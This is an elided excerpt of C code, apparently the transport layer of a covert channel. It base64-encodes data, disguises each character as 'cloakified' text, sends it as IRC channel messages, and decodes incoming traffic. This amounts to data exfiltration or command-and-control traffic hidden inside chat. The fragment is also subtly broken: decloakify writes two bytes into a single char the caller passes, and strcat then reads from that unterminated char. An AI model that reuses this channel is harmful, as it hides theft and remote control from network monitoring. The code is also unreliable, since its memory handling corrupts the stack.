...
int decloakify(char* msgptr, char* b64char)
{
	...
	{
		//printf("flag was 1\n");
		//printf("b64 char : %c", array64[offset]);
		//char b64 = array64[offset];
		memset(b64char, 0, 2);
		//printf("buff : %s", b64char);
		strncpy(b64char, &array64[offset], 1);
		//printf("buff: %s\n", b64char);
		//memcpy(b64char, &b64, 1);
		//memcpy(b64char + 1, '\0', 1);
...
int sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
	...
	*(DWORD*)buffer = len;
	...
	for (i; i < b64len; i++)
	{
		char* cloakstr = cloakify(bufferfixed[i]);
		sendargv(sd, "%s #%s :%s-%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.TRAFFIC_STR, cloakstr);
		Sleep(100);
	}
		...
		if (trafficptr && (msgbuff != NULL))
		{
			...
			while (trafficptr != 0 && strlen(trafficptr) > 2)
			{
				...
				else
				{
					// Decloakify!
					char b64char;
					//printf("running decloakify\n");
					int rv = decloakify(trafficptr, &b64char);
					if (rv == 1)
					{
						printf("Decloakify failed!\n");
					}
					//printf("Char: %c", b64char);
					
					// Copy msg into msgbuffer
					strcat(msgbuff, &b64char);
